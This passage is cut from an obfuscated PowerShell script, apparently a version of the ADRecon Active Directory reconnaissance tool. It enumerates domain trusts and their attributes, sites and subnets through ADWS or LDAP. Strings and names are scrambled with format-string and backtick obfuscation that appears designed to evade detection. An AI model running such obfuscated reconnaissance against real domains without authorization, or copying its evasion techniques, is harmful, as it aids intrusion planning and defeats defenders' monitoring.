        2 = ("{1}{0}" -f 'ound','Outb');
        3 = ("{2}{0}{1}"-f 'Directi','onal','Bi');
    }

    
    ${tt`Ad} = @{
        1 = ("{1}{0}{2}"-f 'o','D','wnlevel');
        2 = ("{1}{0}" -f'l','Upleve');
        3 = "MIT";
        4 = "DCE";
    }

    If (${MetH`Od} -eq ("{0}{1}" -f 'AD','WS'))
    {
        Try
        {
            ${adt`RUS`Ts} = &("{1}{0}{2}" -f'et-ADObj','G','ect') -LDAPFilter (("{8}{2}{6}{7}{5}{3}{0}{4}{1}"-f'Dom','n)','jectClass=t','d','ai','e','rus','t','(ob')) -Properties ("{3}{2}{1}{0}" -f 'uishedName','g','tin','Dis'),("{0}{2}{1}"-f 't','Partner','rust'),("{0}{2}{3}{4}{1}" -f't','ection','ru','st','dir'),("{0}{1}{2}" -f'trust','ty','pe'),("{0}{3}{1}{2}"-f 'Tr','stAttribu','tes','u'),("{3}{2}{1}{0}" -f'eated','r','nC','whe'),("{0}{2}{1}"-f 'wh','Changed','en')
        }
        Catch
        {
            &("{0}{2}{3}{1}" -f'W','rning','ri','te-Wa') ("{11}{0}{6}{10}{1}{2}{5}{4}{9}{3}{7}{8}"-f'Get-AD','nu','m','g ','i','erat','RTru','tr','ustedDomain Objects','n','st] Error while e','[')
            &("{2}{1}{3}{0}"-f'e','i','Wr','te-Verbos') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULl}
        }

        If (${a`DtRU`sTs})
        {
            &("{1}{3}{2}{0}" -f 'e','Wri','os','te-Verb') "[*] Total Trusts: $([ADRecon.ADWSClass]::ObjectCount($ADTrusts)) "
            
            ${adtr`USto`BJ} = @()
            ${a`DTR`U`StS} | &("{0}{4}{2}{3}{1}" -f'ForEach','t','bje','c','-O') {
                
                ${o`BJ} = &("{0}{3}{1}{2}"-f 'N','O','bject','ew-') ("{2}{0}{1}"-f'SObjec','t','P')
                ${O`BJ} | &("{0}{2}{1}{3}"-f 'Add-','mb','Me','er') -MemberType ("{0}{1}{2}{3}" -f 'No','teP','rope','rty') -Name ("{0}{2}{4}{3}{1}" -f'So','in','u','ce Doma','r') -Value (&("{3}{0}{1}{2}"-f 'DNt','oFQD','N','Get-') ${_}."d`isTI`N`GUiSh`edname")
                ${O`BJ} | &("{2}{1}{0}"-f'mber','Me','Add-') -MemberType ("{0}{2}{1}"-f'Not','y','ePropert') -Name ("{0}{2}{1}" -f 'Ta','ain','rget Dom') -Value ${_}."TruSt`p`Art`NER"
                ${tR`USTdi`ReCtION} = [string] ${T`dad}[${_}."TrUsTdI`RecT`IoN"]
                ${O`BJ} | &("{1}{0}{2}" -f 'mb','Add-Me','er') -MemberType ("{2}{3}{0}{1}"-f 'ePrope','rty','N','ot') -Name ("{1}{3}{2}{0}"-f'ion','Trus','rect','t Di') -Value ${tRu`stdIR`e`CtIoN}
                ${t`RUST`T`ype} = [string] ${tT`AD}[${_}."t`RUsttYpE"]
                ${O`Bj} | &("{1}{2}{0}" -f 'ember','Ad','d-M') -MemberType ("{3}{1}{2}{0}" -f 'ty','rop','er','NoteP') -Name ("{0}{2}{1}"-f'T','pe','rust Ty') -Value ${TR`USTt`yPe}

                ${T`Ru`sT`ATtriBuT`Es} = ${n`ULl}
                If ([int32] ${_}."TRuSta`T`TRiBu`Tes" -band 0x00000001) { ${T`R`USTATtRI`Bu`TES} += ("{3}{0}{1}{2}" -f'n Tr','ansitive',',','No') }
                If ([int32] ${_}."t`RusTA`TtribuT`ES" -band 0x00000002) { ${T`RUst`A`Tt`RIbUTes} += ("{0}{1}" -f 'U','pLevel,') }
                If ([int32] ${_}."T`RuStattrIb`UT`es" -band 0x00000004) { ${tr`UStAT`TR`IBUtEs} += ("{3}{2}{1}{0}" -f 'ined,','nt','ara','Qu') } 
                If ([int32] ${_}."TRuS`TaT`Tri`BUT`Es" -band 0x00000008) { ${tR`UsTATT`R`iBUT`ES} += ("{2}{3}{1}{0}" -f 've,','Transiti','Forest',' ') }
                If ([int32] ${_}."T`Rus`TA`TtRiB`UteS" -band 0x00000010) { ${t`RUStAt`Tr`I`Butes} += ("{0}{4}{5}{1}{3}{6}{2}"-f'Cross','niza',',','t',' ','Orga','ion') } 
                If ([int32] ${_}."trUsTA`TTRIB`U`TES" -band 0x00000020) { ${TRu`sT`Att`RIb`Utes} += ("{2}{0}{3}{1}" -f 'or','t,','Within F','es') }
                If ([int32] ${_}."tRU`STAt`TriBut`eS" -band 0x00000040) { ${trU`STaT`T`RIB`UTeS} += ("{5}{0}{1}{2}{3}{4}" -f'a','t ','a','s E','xternal,','Tre') }
                If ([int32] ${_}."tru`StA`TTRIB`UTes" -band 0x00000080) { ${t`R`UStATtriB`UTeS} += ("{1}{3}{0}{4}{2}{5}" -f ' R','Use','Encryptio','s','C4 ','n,') }
                If ([int32] ${_}."t`RUS`TATt`RIB`UTEs" -band 0x00000200) { ${tRU`sTa`TTRIBU`Tes} += ("{2}{4}{0}{1}{3}" -f 'el','egation','No TG',',','T D') }
                If ([int32] ${_}."trUS`TAt`TRIb`UTEs" -band 0x00000400) { ${T`Ru`Sta`T`T`RIButes} += ("{2}{0}{1}{3}"-f ' ','Tru','PIM','st,') }
                If (${t`Rus`TATTriBUTEs})
                {
                    ${t`Ru`STaTtR`Ib`UTEs} = ${tRuStaT`TrIB`U`T`es}.("{1}{0}"-f 'imEnd','Tr').Invoke(",")
                }
                ${o`BJ} | &("{1}{0}{2}" -f'd-Me','Ad','mber') -MemberType ("{0}{1}{3}{2}" -f'NoteP','ro','rty','pe') -Name ("{0}{2}{1}" -f'Attr','utes','ib') -Value ${TRUs`TAtTr`ibUt`ES}
                ${O`BJ} | &("{2}{1}{0}"-f'ber','dd-Mem','A') -MemberType ("{2}{1}{0}{3}"-f'rop','oteP','N','erty') -Name ("{0}{3}{2}{1}" -f 'whenCr','d','e','eat') -Value ([DateTime] $(${_}."W`HencreA`Ted"))
                ${o`BJ} | &("{2}{1}{3}{0}" -f 'r','-Memb','Add','e') -MemberType ("{0}{2}{1}"-f'NotePr','erty','op') -Name ("{2}{1}{3}{0}" -f'd','nChan','whe','ge') -Value ([DateTime] $(${_}."wheNCh`Ang`eD"))
                ${aDTru`St`oBj} += ${o`Bj}
            }
            &("{2}{1}{0}" -f 'e-Variable','emov','R') ("{1}{2}{0}" -f'usts','AD','Tr')
        }
    }

    If (${m`eTh`OD} -eq ("{1}{0}"-f'P','LDA'))
    {
        ${O`BJ`sE`ArCHER} = &("{1}{0}{2}" -f 'w-Obje','Ne','ct') ("{9}{0}{1}{7}{6}{3}{4}{10}{2}{11}{8}{5}" -f 'r','ect','rec','er','vices','her','yS','or','c','System.Di','.Di','torySear') ${OBj`doMa`In}
        ${O`B`jS`eArCHEr}."paGe`sIZe" = ${pa`GEs`IZe}
        ${obJSEaRc`h`ER}."F`il`TER" = (("{6}{5}{3}{4}{0}{1}{2}"-f 'edDomai','n',')','ctClass=trus','t','obje','('))
        ${obj`SeA`R`cHeR}."PR`oPE`RTIES`TOLoaD".("{1}{0}"-f'ddRange','A').Invoke((("{0}{1}{2}{3}" -f 'distingu','ishe','dn','ame'),("{1}{0}{3}{2}"-f 'r','trustpa','r','tne'),("{3}{4}{2}{1}{0}"-f 'on','i','rect','t','rustdi'),("{1}{2}{0}{3}" -f 'ty','trus','t','pe'),("{1}{2}{0}" -f 'ibutes','t','rustattr'),("{2}{3}{0}{1}" -f'a','ted','whenc','re'),("{1}{2}{0}{3}"-f 'hange','wh','enc','d')))
        ${oB`JseA`R`cHER}."se`Arc`hSC`OPe" = ("{0}{2}{1}"-f'Sub','ree','t')

        Try
        {
            ${AdTr`U`s`Ts} = ${obj`sEa`Rc`hER}.("{0}{1}"-f'Find','All').Invoke()
        }
        Catch
        {
            &("{0}{2}{1}"-f 'Write-War','ing','n') ("{5}{1}{7}{3}{0}{13}{11}{2}{9}{12}{10}{8}{6}{4}" -f'r ','t-AD',' enum','] Erro','jects','[Ge','ain Ob','RTrust','trustedDom','erat','g ','hile','in','w')
            &("{3}{0}{2}{1}" -f 'Ve','e','rbos','Write-') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`UlL}
        }
        ${oBjS`eAR`Ch`er}.("{1}{0}{2}" -f'ispos','d','e').Invoke()

        If (${a`Dtru`STs})
        {
            &("{3}{4}{0}{2}{1}"-f'te','Verbose','-','W','ri') "[*] Total Trusts: $([ADRecon.LDAPClass]::ObjectCount($ADTrusts)) "
            
            ${adT`RUS`TObJ} = @()
            ${adTr`U`STS} | &("{4}{0}{1}{2}{3}" -f 'o','rEa','ch-Objec','t','F') {
                
                ${O`Bj} = &("{0}{2}{1}{3}"-f 'Ne','jec','w-Ob','t') ("{2}{1}{0}"-f 'ct','bje','PSO')
                ${o`BJ} | &("{1}{0}{2}"-f'd','A','d-Member') -MemberType ("{2}{1}{0}" -f'erty','oteProp','N') -Name ("{1}{2}{0}"-f'ce Domain','Sou','r') -Value $(&("{1}{2}{0}{3}" -f 'FQD','Get-DN','to','N') ([string] ${_}."proP`eR`TIEs"."D`iS`TiN`guI`SHednamE"))
                ${O`BJ} | &("{2}{0}{1}{3}"-f 'Mem','be','Add-','r') -MemberType ("{3}{1}{0}{2}"-f'ePropert','ot','y','N') -Name ("{3}{1}{2}{0}" -f'n','arget ','Domai','T') -Value $([string] ${_}."p`R`oPErties"."TRuS`T`p`ArTNEr")
                ${T`RUSTDI`REc`TI`On} = [string] ${T`dAd}[${_}."pR`O`pErtiES"."tRU`S`TdIRECtiON"]
                ${O`Bj} | &("{3}{1}{0}{2}" -f'mb','d-Me','er','Ad') -MemberType ("{1}{0}{3}{2}"-f 'ote','N','roperty','P') -Name ("{2}{0}{1}"-f'Direc','tion','Trust ') -Value ${tRUSt`D`IREC`TI`oN}
                ${t`RUsT`TYpE} = [string] ${TT`AD}[${_}."P`RoP`ErTI`es"."tru`s`TTy`pe"]
                ${O`BJ} | &("{0}{1}{2}"-f'Ad','d-Membe','r') -MemberType ("{2}{1}{0}"-f'perty','ePro','Not') -Name ("{1}{2}{0}" -f 'st Type','Tr','u') -Value ${tR`U`stTyPE}

                ${Tr`UStat`TrI`ButeS} = ${N`ULl}
                If ([int32] ${_}."p`ROpert`I`Es"."T`R`USta`TtrIbUTes"[0] -band 0x00000001) { ${Tr`USTa`TTRiB`UteS} += ("{2}{1}{0}{3}"-f'iti','Trans','Non ','ve,') }
                If ([int32] ${_}."pr`o`pErti`es"."tr`UST`A`TTRIbU`TEs"[0] -band 0x00000002) { ${t`RU`STA`TtRibuTeS} += ("{1}{0}"-f'Level,','Up') }
                If ([int32] ${_}."Pr`OPe`R`TIEs"."TrU`Sta`TtRIbutEs"[0] -band 0x00000004) { ${trUS`TAtT`RIbU`TeS} += ("{2}{0}{3}{1}"-f'uara','ined,','Q','nt') } 
                If ([int32] ${_}."Pro`PE`RT`iES"."T`RUs`TatTrIBU`T`es"[0] -band 0x00000008) { ${TRUsTA`TTR`ib`U`T`es} += ("{1}{2}{0}{3}" -f 'iv','Forest Tr','ansit','e,') }
                If ([int32] ${_}."P`RO`PERtIEs"."TR`Us`TaTTRiB`UtEs"[0] -band 0x00000010) { ${t`RuST`AtTriB`UteS} += ("{0}{1}{2}{3}" -f 'Cr','oss Organiz','atio','n,') } 
                If ([int32] ${_}."Pr`Oper`TIeS"."TRus`T`A`TtriB`UTEs"[0] -band 0x00000020) { ${tr`US`TA`TT`Rib`UteS} += ("{1}{2}{3}{4}{0}" -f 'est,','Wi','th','in ','For') }
                If ([int32] ${_}."pr`opeRTi`Es"."Tr`UstatTr`IbUTES"[0] -band 0x00000040) { ${tRu`sT`A`TtRIbU`TeS} += ("{2}{3}{0}{4}{1}"-f 's E','ernal,','Tre','at a','xt') }
                If ([int32] ${_}."Pr`OpEr`Ties"."T`RUst`ATTriBUtES"[0] -band 0x00000080) { ${t`RuSt`A`TtRIBU`TeS} += ("{1}{2}{0}{3}"-f 'o','Uses',' RC4 Encrypti','n,') }
                If ([int32] ${_}."p`ROpe`RTieS"."tRuStA`TtRIb`UTes"[0] -band 0x00000200) { ${tRusTaTT`R`iB`UteS} += ("{1}{4}{2}{0}{3}" -f'elegation','No',' D',',',' TGT') }
                If ([int32] ${_}."PR`OpERT`IES"."TRUStATT`Ri`BuT`Es"[0] -band 0x00000400) { ${Tr`USTaTTR`IBu`T`ES} += ("{1}{0}{3}{2}" -f 'IM','P','ust,',' Tr') }
                If (${trus`TATt`RIB`UTEs})
                {
                    ${Tr`USTaT`TrIBU`TEs} = ${t`R`UStAt`TrIbUTeS}.("{0}{1}{2}"-f'Trim','En','d').Invoke(",")
                }
                ${O`BJ} | &("{1}{0}{2}"-f'Me','Add-','mber') -MemberType ("{0}{2}{1}"-f'NoteProp','y','ert') -Name ("{2}{1}{0}"-f 'es','ibut','Attr') -Value ${Trus`TatTR`iBu`TeS}
                ${O`BJ} | &("{1}{2}{0}"-f 'r','Ad','d-Membe') -MemberType ("{2}{0}{1}" -f 'otePro','perty','N') -Name ("{2}{1}{3}{0}" -f'ated','enCr','wh','e') -Value ([DateTime] $(${_}."pROp`e`RT`IES"."w`hen`cReATed"))
                ${O`BJ} | &("{2}{0}{1}"-f 'dd-Membe','r','A') -MemberType ("{3}{2}{0}{1}"-f'ert','y','p','NotePro') -Name ("{0}{3}{2}{1}"-f 'wh','ed','nChang','e') -Value ([DateTime] $(${_}."PrOP`E`RtieS"."wHEnch`A`NG`Ed"))
                ${AD`TRuST`OBJ} += ${O`Bj}
            }
            &("{3}{1}{0}{2}"-f'v','mo','e-Variable','Re') ("{1}{0}"-f'sts','ADTru')
        }
    }

    If (${aDt`R`USTobj})
    {
        Return ${ADTRuS`T`o`Bj}
    }
    Else
    {
        Return ${nu`Ll}
    }
}

Function G`e`T-ADRSiTE
{

    param(
        [Parameter(MANdaTory = ${T`RUE})]
        [string] ${me`Thod},

        [Parameter(MAnDatoRy = ${F`ALSE})]
        [DirectoryServices.DirectoryEntry] ${OB`J`dOMAin},

        [Parameter(mANDatoRY = ${faL`Se})]
        [DirectoryServices.DirectoryEntry] ${ob`J`DO`MAi`N`RootdSe},

        [Parameter(ManDATOry = ${fAl`Se})]
        [string] ${doMAI`NcOn`T`R`OlLeR},

        [Parameter(ManDatOrY = ${F`A`Lse})]
        [Management.Automation.PSCredential] ${c`REDENti`AL} =  $clF0n::"e`mpty"
    )

    If (${me`THOd} -eq ("{0}{1}" -f'A','DWS'))
    {
        Try
        {
            ${S`e`ARchP`ATh} = ("{2}{0}{1}"-f'N=','Sites','C')
            ${AD`sI`TES} = &("{3}{0}{1}{2}" -f'e','t-','ADObject','G') -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter (("{2}{3}{4}{0}{1}" -f 'ss=site',')','(','ob','jectCla')) -Properties ("{1}{0}"-f 'ame','N'),("{0}{2}{1}"-f 'D','scription','e'),("{0}{1}{2}{3}" -f 'whe','nC','rea','ted'),("{2}{3}{0}{1}" -f'g','ed','whenC','han')
        }
        Catch
        {
            &("{0}{2}{1}"-f 'Write-Warn','g','in') ("{3}{10}{1}{4}{0}{5}{8}{9}{7}{6}{2}"-f ' ','Error','s','[Get-ADRSite',' while','enumerating ','ect','bj','Sit','e O','] ')
            &("{1}{4}{2}{3}{0}" -f'rbose','Writ','-V','e','e') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULL}
        }

        If (${a`DSiT`es})
        {
            &("{0}{1}{2}" -f'W','rite-Verbo','se') "[*] Total Sites: $([ADRecon.ADWSClass]::ObjectCount($ADSites)) "
            
            ${ADS`I`T`EObj} = @()
            ${A`d`sITeS} | &("{3}{0}{2}{1}"-f 'rEac','bject','h-O','Fo') {
                
                ${O`Bj} = &("{0}{2}{1}" -f'New-Ob','ct','je') ("{1}{0}"-f'ct','PSObje')
                ${O`BJ} | &("{2}{1}{0}" -f 'ber','m','Add-Me') -MemberType ("{0}{2}{3}{1}"-f'Note','perty','Pr','o') -Name ("{0}{1}"-f 'Nam','e') -Value ${_}."Na`Me"
                ${o`BJ} | &("{1}{2}{0}" -f 'ber','Add-Me','m') -MemberType ("{0}{1}{2}" -f 'NoteP','r','operty') -Name ("{0}{3}{2}{1}"-f 'D','tion','ip','escr') -Value ${_}."DEs`c`RiPTiON"
                ${O`Bj} | &("{3}{0}{2}{1}" -f '-M','er','emb','Add') -MemberType ("{0}{1}{2}" -f'NoteProp','ert','y') -Name ("{2}{1}{0}{3}" -f 'nCre','he','w','ated') -Value ${_}."w`h`ENcre`Ated"
                ${O`Bj} | &("{1}{0}{2}"-f 'dd-Memb','A','er') -MemberType ("{2}{0}{1}{3}"-f 'Pr','op','Note','erty') -Name ("{1}{2}{0}"-f 'anged','whenC','h') -Value ${_}."wH`enCh`A`NgeD"
                ${ad`s`iTEObJ} += ${O`BJ}
            }
            &("{1}{3}{2}{4}{0}" -f'-Variable','Re','v','mo','e') ("{2}{0}{1}"-f 'DSit','es','A')
        }
    }

    If (${Me`ThoD} -eq ("{1}{0}" -f'AP','LD'))
    {
        ${SeaRChp`A`Th} = ("{1}{0}{2}"-f 'Sit','CN=','es')
        If (${Cr`EDe`N`TIAl} -ne  ( GEt-vArIaBlE  ClF0n  ).Value::"eM`pTy")
        {
            ${O`BjSEar`Chp`ATH} = &("{0}{1}{2}" -f 'N','e','w-Object') ("{2}{0}{6}{3}{5}{4}{1}{7}"-f 'rySe','En','System.Directo','i','Directory','ces.','rv','try') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", ${cREde`N`T`IAl}."U`seRNa`me",${cr`eDe`NtIaL}.("{2}{1}{3}{5}{0}{4}" -f'enti','e','G','tN','al','etworkCred').Invoke()."PaSSwo`Rd"
        }
        Else
        {
            ${O`Bj`SE`ArchpatH} = &("{0}{2}{1}"-f'N','ct','ew-Obje') ("{2}{9}{6}{1}{11}{8}{3}{5}{7}{4}{10}{0}"-f'yEntry','.','Sy','or','ces.Dire','yS','m','ervi','ct','ste','ctor','Dire') "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        ${OB`jS`eARCH`eR} = &("{1}{2}{0}" -f 'ect','N','ew-Obj') ("{4}{2}{1}{6}{10}{8}{9}{5}{3}{7}{0}"-f'archer','Di','em.','rectoryS','Syst','rvices.Di','re','e','S','e','ctory') ${ObJS`E`Arc`HpA`Th}
        ${objsEA`RC`h`er}."FI`lter" = ("{1}{3}{4}{0}{2}" -f 'ass=si','(o','te)','bjectC','l')
        ${o`BJs`EArch`er}."sEa`R`cHSCOpe" = ("{0}{1}"-f 'Sub','tree')

        Try
        {
            ${aDs`It`eS} = ${Ob`JSea`RCHEr}.("{1}{0}{2}"-f 'Al','Find','l').Invoke()
        }
        Catch
        {
            &("{3}{1}{0}{4}{2}"-f'ite-War','r','ng','W','ni') ("{0}{4}{2}{3}{7}{1}{8}{6}{5}"-f '[Get-','il','rror',' w','ADRSite] E','ng Site Objects',' enumerati','h','e')
            &("{1}{3}{0}{2}" -f 'rbos','Wr','e','ite-Ve') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULL}
        }
        ${O`BjsE`ArCh`er}.("{0}{1}" -f 'di','spose').Invoke()

        If (${AdsI`Tes})
        {
            &("{0}{3}{1}{2}" -f'Writ','-Ve','rbose','e') "[*] Total Sites: $([ADRecon.LDAPClass]::ObjectCount($ADSites)) "
            
            ${a`Dsit`eobJ} = @()
            ${A`dSi`TES} | &("{0}{4}{2}{3}{1}"-f 'For','ct','j','e','Each-Ob') {
                
                ${o`Bj} = &("{2}{0}{3}{1}" -f'w-','ject','Ne','Ob') ("{0}{1}{2}" -f'P','S','Object')
                ${O`BJ} | &("{0}{1}{2}" -f'Add','-Mem','ber') -MemberType ("{2}{1}{0}" -f 'perty','ePro','Not') -Name ("{1}{0}"-f'ame','N') -Value $([string] ${_}."pROP`E`RtiES"."Na`ME")
                ${O`Bj} | &("{3}{2}{1}{0}"-f 'r','be','dd-Mem','A') -MemberType ("{0}{2}{1}" -f 'N','roperty','oteP') -Name ("{1}{2}{0}" -f'on','Descript','i') -Value $([string] ${_}."prO`P`eR`Ties"."descr`I`ptION")
                ${O`BJ} | &("{0}{1}{2}"-f 'A','dd-','Member') -MemberType ("{0}{2}{1}"-f'Note','y','Propert') -Name ("{2}{1}{0}"-f 'Created','n','whe') -Value ([DateTime] $(${_}."PRO`PeR`TiEs"."Wh`EncRe`ATEd"))
                ${O`BJ} | &("{1}{0}{3}{2}" -f 'd-Mem','Ad','er','b') -MemberType ("{1}{0}{2}" -f 'Prope','Note','rty') -Name ("{1}{2}{0}"-f'd','whenCh','ange') -Value ([DateTime] $(${_}."PrO`pER`T`IEs"."W`HE`NChanG`ED"))
                ${aDsI`T`eoBJ} += ${O`Bj}
            }
            &("{3}{2}{0}{1}" -f'e-Variabl','e','mov','Re') ("{0}{1}"-f'A','DSites')
        }
    }

    If (${Ad`s`iTEobJ})
    {
        Return ${AdSitE`o`BJ}
    }
    Else
    {
        Return ${NU`lL}
    }
}

Function GE`T-ad`RS`UBNet
{

    param(
        [Parameter(manDAtORY = ${tr`Ue})]
        [string] ${meT`h`oD},

        [Parameter(Mandatory = ${Fa`l`Se})]
        [DirectoryServices.DirectoryEntry] ${OBj`dOm`AIn},

        [Parameter(mAndatorY = ${fAl`SE})]
        [DirectoryServices.DirectoryEntry] ${Ob`j`DoMAin`RO`otDsE},

        [Parameter(MaNdAtOrY = ${Fal`sE})]
        [string] ${DoMa`iNCo`N`Tro`LLer},

        [Parameter(mandAToRy = ${f`A`lSE})]
        [Management.Automation.PSCredential] ${cr`EdeNt`i`AL} =  ( gET-vARIablE clf0N  ).Value::"EM`pTY"
    )

    If (${m`eT`hOD} -eq ("{1}{0}" -f'S','ADW'))
    {
        Try
        {
            ${sea`RCHp`AtH} = ("{2}{0}{3}{1}"-f 'bne','Sites','CN=Su','ts,CN=')
            ${AD`SU`BnETs} = &("{0}{3}{1}{2}" -f'G','ADO','bject','et-') -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter (("{2}{3}{1}{0}" -f't)','ss=subne','(ob','jectCla')) -Properties ("{0}{1}"-f'Na','me'),("{2}{1}{0}{3}" -f 'o','ripti','Desc','n'),("{1}{0}{2}"-f 't','si','eObject'),("{0}{2}{1}"-f 'w','ed','henCreat'),("{0}{3}{2}{1}" -f'wh','ged','n','enCha')
        }
        Catch
        {
            &("{3}{0}{2}{1}" -f '-W','ing','arn','Write') ("{1}{0}{9}{8}{2}{10}{7}{5}{6}{3}{4}"-f 'Get-AD','[','r while','t ','Objects','ating Subn','e','numer','Subnet] Erro','R',' e')
            &("{2}{0}{1}"-f'rite-','Verbose','W') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`LL}
        }

        If (${AdSuBN`e`TS})
        {
            &("{2}{3}{0}{1}" -f 'erbo','se','Wr','ite-V') "[*] Total Subnets: $([ADRecon.ADWSClass]::ObjectCount($ADSubnets)) "
            
            ${ADS`U`Bn`ETOBJ} = @()
            ${aD`s`Ubnets} | &("{3}{2}{0}{1}" -f '-Obj','ect','rEach','Fo') {
                
                ${O`BJ} = &("{0}{1}{2}"-f'New','-O','bject') ("{2}{1}{0}" -f 't','SObjec','P')
                ${O`BJ} | &("{1}{2}{0}"-f 'er','Ad','d-Memb') -MemberType ("{0}{1}{2}{3}" -f 'NotePr','ope','r','ty') -Name ("{1}{0}"-f 'e','Sit') -Value $((${_}."sIT`EO`BjEcT" -Split ",")[0] -replace 'CN=','')
                ${o`Bj} | &("{2}{1}{0}"-f 'mber','e','Add-M') -MemberType ("{1}{0}{2}" -f'e','NoteProp','rty') -Name ("{1}{0}" -f'e','Nam') -Value ${_}."n`AME"
                ${o`BJ} | &("{2}{1}{0}" -f'ember','-M','Add') -MemberType ("{1}{3}{0}{2}"-f'r','No','ty','tePrope') -Name ("{2}{3}{0}{1}" -f 't','ion','De','scrip') -Value ${_}."DE`ScriPT`iON"
                ${O`Bj} | &("{1}{2}{0}"-f'ember','Ad','d-M') -MemberType ("{3}{0}{1}{2}" -f 'tePro','pert','y','No') -Name ("{2}{1}{0}"-f'enCreated','h','w') -Value ${_}."WhENc`R`eAtEd"
                ${O`Bj} | &("{1}{2}{3}{0}"-f'ember','A','dd','-M') -MemberType ("{1}{0}{2}"-f 'e','NoteProp','rty') -Name ("{1}{0}{2}"-f 'ha','whenC','nged') -Value ${_}."WhE`Ncha`NGED"
                ${A`dSU`Bn`ETOBJ} += ${o`BJ}
            }
            &("{0}{2}{1}{3}" -f 'Re','ab','move-Vari','le') ("{2}{0}{1}"-f 'u','bnets','ADS')
        }
    }

    If (${mEt`hoD} -eq ("{1}{0}"-f'AP','LD'))
    {
        ${SEaRc`h`pA`Th} = ("{2}{5}{0}{3}{1}{4}"-f'b','C','C','nets,','N=Sites','N=Su')
        If (${CRE`d`ENT`ial} -ne  $clF0n::"E`MpTy")
        {
            ${obJ`Se`ArChpA`TH} = &("{1}{0}{2}"-f'-Obj','New','ect') ("{4}{7}{5}{3}{2}{0}{1}{6}"-f 'ctoryEn','t','re','vices.Di','System.','torySer','ry','Direc') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", ${cRe`D`entIAL}."u`sern`Ame",${Cr`EdEnt`i`AL}.("{0}{3}{2}{1}"-f'GetNetworkC','ial','ent','red').Invoke()."P`As`SWoRd"
        }
        Else
        {
            ${OB`jSEarC`hPaTH} = &("{2}{0}{1}"-f 'ew-Ob','ject','N') ("{6}{5}{3}{2}{0}{4}{1}{7}"-f 'toryServices.Dire','En','c','e','ctory','ystem.Dir','S','try') "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        ${OBJSE`AR`C`her} = &("{0}{2}{1}{3}"-f 'N','ec','ew-Obj','t') ("{11}{5}{10}{3}{7}{8}{0}{9}{4}{6}{2}{1}"-f 'ervices.D','er','rch','Directo','e','te','a','r','yS','irectoryS','m.','Sys') ${ob`JseArch`path}
        ${OBjSEa`Rc`h`Er}."f`iLTeR" = ("{0}{2}{3}{4}{1}"-f '(object','bnet)','Cl','as','s=su')
        ${O`BJseArch`er}."s`EArcHSC`opE" = ("{1}{0}" -f 'btree','Su')

        Try
        {
            ${A`d`SubnetS} = ${OBjSe`A`R`Cher}.("{1}{0}"-f'indAll','F').Invoke()
        }
        Catch
        {
            &("{3}{4}{2}{1}{0}" -f'g','in','arn','Write','-W') ("{3}{4}{1}{7}{6}{0}{10}{12}{11}{5}{14}{9}{13}{15}{2}{8}" -f ' ','bne','t','[Get-','ADRSu','ub','Error while','t] ','s','et ','enumer','ting S','a','Obje','n','c')
            &("{1}{2}{0}" -f 'erbose','Writ','e-V') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`ll}
        }
        ${O`Bjsea`Rch`er}.("{1}{0}" -f'e','dispos').Invoke()

        If (${a`Ds`UbnE`Ts})
        {
            &("{2}{0}{1}"-f 'e-Ve','rbose','Writ') "[*] Total Subnets: $([ADRecon.LDAPClass]::ObjectCount($ADSubnets)) "
            
            ${AD`SuBne`TobJ} = @()
            ${AdSub`NE`Ts} | &("{0}{2}{1}{3}" -f 'For','ec','Each-Obj','t') {
                
                ${O`BJ} = &("{2}{0}{1}"-f'c','t','New-Obje') ("{1}{2}{0}"-f 'ject','PS','Ob')
                ${O`BJ} | &("{2}{0}{1}"-f 'Membe','r','Add-') -MemberType ("{3}{2}{0}{1}" -f 'p','erty','ro','NoteP') -Name ("{1}{0}" -f'te','Si') -Value $((([string] ${_}."PrO`Per`T`IeS"."S`I`TEObjECt") -Split ",")[0] -replace 'CN=','')
                ${o`Bj} | &("{2}{1}{0}"-f 'ber','em','Add-M') -MemberType ("{3}{2}{0}{1}" -f 'Pr','operty','te','No') -Name ("{1}{0}"-f 'ame','N') -Value $([string] ${_}."P`R`OPert`ieS"."N`AmE")
                ${O`Bj} | &("{1}{0}{2}"-f 'dd-Me','A','mber') -MemberType ("{0}{1}{2}{3}" -f 'NotePr','op','e','rty') -Name ("{1}{0}{2}"-f 'crip','Des','tion') -Value $([string] ${_}."p`Ro`perTieS"."deSCr`I`pt`IoN")
                ${O`BJ} | &("{2}{0}{1}"-f'M','ember','Add-') -MemberType ("{0}{1}{2}"-f 'NoteP','r','operty') -Name ("{0}{2}{1}" -f 'when','d','Create') -Value ([DateTime] $(${_}."P`Rop`e`Rties"."WH`Encr`EATED"))
                ${O`BJ} | &("{2}{0}{1}" -f'dd-M','ember','A') -MemberType ("{0}{2}{3}{1}" -f'No','y','teP','ropert') -Name ("{2}{0}{1}"-f 'nChang','ed','whe') -Value ([DateTime] $(${_}."PR`O`pEr`TIES"."WHe`NChA`N`GEd"))
                ${A`D`Su`BNetoBj} += ${O`BJ}
            }
            &("{0}{1}{3}{2}" -f 'Remove-V','aria','e','bl') ("{0}{1}"-f'A','DSubnets')
        }
    }

    If (${adSubn`e`TobJ})
    {
        Return ${ad`Subn`eTobj}
    }
    Else
    {
        Return ${nu`LL}
    }
}


Function GeT`-`A`dR`SchEMAHIS`TORY
{

    param(
        [Parameter(mAndatory = ${t`RuE})]
        [string] ${METh`oD},

        [Parameter(mAndAtOry = ${F`AL`Se})]
        [DirectoryServices.DirectoryEntry] ${Objd`OmA`iN},

        [Parameter(MANdAToRy = ${F`Alse})]
        [DirectoryServices.DirectoryEntry] ${O`BjDOM`A`iNRoOtdsE},

        [Parameter(mandAtoRY = ${F`ALsE})]
        [string] ${D`omaInconTR`O`Ller},

        [Parameter(MANdatORy = ${f`A`LSE})]
        [Management.Automation.PSCredential] ${CR`EDeNt`iaL} =   $clf0n::"E`MptY"
    )

